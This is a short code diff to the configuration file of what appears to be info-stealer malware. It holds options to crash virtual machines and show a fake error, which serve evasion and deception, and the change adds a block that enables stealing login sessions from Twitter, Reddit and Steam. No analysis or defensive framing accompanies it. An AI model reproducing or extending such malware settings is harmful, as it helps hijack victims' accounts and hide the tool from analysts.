@@ -14,7 +14,11 @@ module.exports = {
   bsodIfVm: true,
   fakeError: true,
   discord: {
-    uninstall: false,
     killProcess: false
+  },
+  sessionStealing: {
+    twitter: true,
+    reddit: true,
+    steam: true
   }
 };
